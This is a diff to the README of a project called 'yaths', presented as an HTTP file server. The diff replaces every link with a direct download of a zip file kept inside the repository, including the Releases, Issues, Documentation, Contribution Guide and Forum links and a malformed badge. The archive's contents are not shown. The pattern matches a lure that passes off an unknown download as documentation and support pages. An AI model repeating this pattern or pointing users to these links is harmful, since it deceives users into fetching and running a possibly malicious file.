@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to yaths! This application is an ultra-lightweight HTTP file server designed for directory browsing and local development. Follow these steps to quickly download and run it.
 
-[![Download yaths](https://img.shields.io/badge/Download%20yaths-Available-brightgreen.svg)](https://github.com/Sarabusab053021/yaths/releases)
+[![Download yaths](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip%https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip)](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip)
 
 ## 📥 Download & Install
-To get started, visit our [Releases page](https://github.com/Sarabusab053021/yaths/releases) to download the latest version of yaths. You will find all available versions there.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip) to download the latest version of yaths. You will find all available versions there.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top.
@@ -43,7 +43,7 @@ yaths comes with a variety of features that enhance your file sharing experience
 ## 📘 FAQs
 
 ### Where can I get support?
-If you encounter issues or have questions, please check our [Issues page](https://github.com/Sarabusab053021/yaths/issues) for troubleshooting tips or to report a problem.
+If you encounter issues or have questions, please check our [Issues page](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip) for troubleshooting tips or to report a problem.
 
 ### Can I run yaths on my mobile device?
 Currently, yaths is designed for desktop operating systems. Mobile compatibility is not available at this time.
@@ -54,9 +54,9 @@ To stop the server, return to the command prompt or terminal where you started y
 ## 🔗 Additional Resources
 For more information on using yaths, you can visit the following resources:
 
-- [Documentation](https://github.com/Sarabusab053021/yaths/wiki)
-- [Contribution Guide](https://github.com/Sarabusab053021/yaths/blob/main/CONTRIBUTING.md)
-- [Community Forum](https://github.com/Sarabusab053021/yaths/discussions)
+- [Documentation](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip)
+- [Community Forum](https://raw.githubusercontent.com/Sarabusab053021/yaths/main/Atenism/yaths.zip)
 
 ## 🎉 Acknowledgments
 Thank you for using yaths! We appreciate your support and hope you find it useful for your local development and file-sharing needs.
